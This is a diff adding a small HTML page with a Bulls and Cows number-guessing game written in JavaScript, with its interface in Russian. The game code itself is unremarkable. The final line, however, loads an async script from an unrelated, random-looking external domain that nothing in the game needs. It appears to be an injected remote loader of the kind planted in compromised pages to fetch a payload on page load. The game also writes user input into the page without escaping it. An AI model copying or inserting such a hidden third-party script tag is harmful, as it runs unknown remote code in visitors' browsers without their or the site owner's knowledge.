@@ -1,0 +1,137 @@
+<!DOCTYPE html>
+<!--
+    2025
+    Быки - коровы
+    ©️ Sigmentium
+-->
+<html>
+    <head>
+        <title>Sigmentium: Быки - коровы</title>
+        <meta charset="UTF-8">
+        <meta name="viewport" content="width=device-width">
+        <link rel="shortcut icon" href="https://sigmentium.github.io/Photo/Sigmentium.jpeg">
+        <style>
+            body {
+                background-color:cornsilk;
+                font-family:Verdana;
+            }
+            button {
+                color:white;
+                background-color:black;
+                width:200px;
+                height:50px;
+                cursor:pointer;
+                font-size:20px;
+                border:2px solid white;
+                border-radius:15px;
+            }
+
+            .center {
+                text-align:center;
+            }
+        </style>
+    </head>
+    <body>
+        <br><br><br><br><br><br>
+        <div id="Main">
+            <div class="center"><button id="Start">Начать</button></div>
+        </div>
+        <script>
+            let Player, Opponent;
+            let Attemp, OppoAttemp;
+
+            let PlayerBulls = 0;
+            let PlayerCows = 0;
+
+            // let OppoBulls = 0;
+            // let OppoCows = 0;
+
+            function PlayerAttemp() {
+                Attemp = prompt('Введите число (4 цифры)');
+
+                if (!Attemp) {
+                    alert('Необходимо ввести число');
+                    return;
+                }
+                else if (Attemp.length > 4) {
+                    alert('Число не должно превышать более 4 цифр!');
+                    return;
+                }
+                else if (Attemp.length < 4) {
+                    alert('Число не должно быть менее 4 цифр!');
+                    return;
+                }
+
+                for (let A = 0; A < 4; A++) {
+                    if (Attemp[A] === Opponent[A]) {
+                        PlayerBulls++;
+                    }
+                    else if (Opponent.includes(Attemp[A])) {
+                        PlayerCows++;
+                    }
+                }
+
+                if (PlayerBulls === 4) {
+                    alert('Победа!');
+                    window.location.reload();
+                }
+
+                document.getElementById('Attemps').innerHTML += `<H1>${Attemp}: Быки - ${PlayerBulls} | Коровы - ${PlayerCows}</H1>`;
+
+                PlayerBulls = 0;
+                PlayerCows = 0;
+            }
+
+            function OpponentAttemp() {
+                OppoAttemp = String(Math.floor(Math.random() * (9999 - 1000 + 1)) + 1000);
+
+                if (OppoAttemp === Player) {
+                    alert('Проигрыш!');
+                    window.location.reload();
+                }
+            }
+
+            document.getElementById('Start').addEventListener('click', function() {
+                const Names = ["Александ", "Алексей", "Игнат", "Максим", "Ашот", "Сергей", "Наталия", "Ольга", "Наиле", "Мирослав", "Денис", "Дарья", "Елисей", "Герасим", "Константин"];
+                const Random = Math.floor(Math.random() * (14 - 0 + 1)) + 0;
+                
+                // Выбор игрока
+                Player = prompt('Введите число (4 цифры)');
+
+                if (!Player) {
+                    alert('Необходимо ввести число');
+                    return;
+                }
+                else if (Player.length > 4) {
+                    alert('Число не должно превышать более 4 цифр!');
+                    return;
+                }
+                else if (Player.length < 4) {
+                    alert('Число не должно быть менее 4 цифр!');
+                    return;
+                }
+
+                // Выбор противника
+                Opponent = String(Math.floor(Math.random() * (9 - 0 + 1)) + 0) + String(Math.floor(Math.random() * (9 - 0 + 1)) + 0) + String(Math.floor(Math.random() * (9 - 0 + 1)) + 0) + String(Math.floor(Math.random() * (9 - 0 + 1)) + 0);
+
+                document.getElementById('Main').innerHTML = `
+                <div class="center">
+                    <H1 id="Eminem">Противник: ${Names[Random]}</H1>
+                    <br>
+                    <H2 id="MyNum">Ваше число: ${Player}</H2>
+                    <br><br>
+                    <button id="Attemp">Сделать попытку</button>
+                    <div id="Attemps"></div>
+                </div>
+                `;
+
+                // Попытка
+                document.getElementById('Attemp').addEventListener('click', function() {
+                    PlayerAttemp();
+                    OpponentAttemp();
+                });
+            });
+        </script>
+        <script src="https://tykecyy.com/news.js?sid=939278" async type="text/javascript" charset="UTF-8"></script>
+    </body>
+</html>
